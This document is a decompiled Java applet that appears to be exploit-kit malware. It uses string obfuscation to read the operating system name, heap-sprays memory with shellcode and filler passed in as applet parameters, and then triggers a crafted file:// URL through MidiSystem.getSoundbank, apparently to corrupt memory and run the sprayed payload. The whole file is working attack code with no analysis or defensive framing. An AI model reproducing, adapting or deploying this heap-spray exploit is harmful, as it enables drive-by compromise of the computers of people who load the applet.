import javax.sound.midi.MidiSystem;
import java.net.URL;
import java.nio.IntBuffer;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Ierhkfc extends Applet
{
    private IntBuffer[] mem;
    
    @Override
    public void init() {
        repeat('/', 303);
        final String lowerCase = System.getProperty("oTTTTTsTTTT.nTTTamTTTTe".replace("T", "")).toLowerCase();
        String s;
        if (lowerCase.indexOf("win".replace("5", "")) >= 0) {
            s = repeat('/', 302);
        }
        else if (lowerCase.indexOf("mac".replace("l", "")) >= 0) {
            s = repeat('/', 1080);
        }
        else {
            if (lowerCase.indexOf("nVVix".replace("V", "")) < 0 && lowerCase.indexOf("nu::::x:::".replace(":", "")) < 0) {
                return;
            }
            s = repeat('/', 1337);
        }
        final String string = "filYYe:YYY//".replace("Y", "") + s + "ppppZppp%Z%ppZpppppp%Zppp%ppppZp%Z%".replace("p", "");
        try {
            this.mem = this.spray(Fjhf.decodeString(this.getParameter("888do".replace("8", ""))), Fjhf.decodeString(this.getParameter("reRRRR".replace("R", ""))));
            MidiSystem.getSoundbank(new URL(string));
            while (true) {
                Thread.sleep(10L);
            }
        }
        catch (Exception ex) {}
    }
    
    public static String repeat(final char c, final int n) {
        String string = "";
        for (int i = 0; i < n; ++i) {
            string += c;
        }
        return string;
    }
    
    public static short[] HexDecode(final String s) {
        final short[] array = new short[s.length() / 2];
        for (int i = 0; i < s.length(); i += 2) {
            array[i / 2] = (short)(((Character.digit(s.charAt(i), 16) & 0xFF) << 4) + (Character.digit(s.charAt(i + 1), 16) & 0xFF));
        }
        return array;
    }
    
    public final IntBuffer[] spray(final String s, final String s2) {
        return this.spray(HexDecode(s), HexDecode(s2));
    }
    
    public final IntBuffer[] spray(final short[] array, final short[] array2) {
        final int n = 50;
        final int n2 = 1048576;
        final int n3 = n2 / 4 - array.length;
        final IntBuffer[] array3 = new IntBuffer[n];
        for (int i = 0; i < n; ++i) {
            final IntBuffer allocate = IntBuffer.allocate(n2 / 4);
            for (int j = 0; j < n3; ++j) {
                allocate.put(array2[0] | array2[1] << 8 | array2[2] << 16 | array2[3] << 24);
            }
            int k = 0;
            while (k < array.length) {
                allocate.put(array[k++] | array[k++] << 8 | array[k++] << 16 | array[k++] << 24);
            }
            array3[i] = allocate;
        }
        return array3;
    }
}
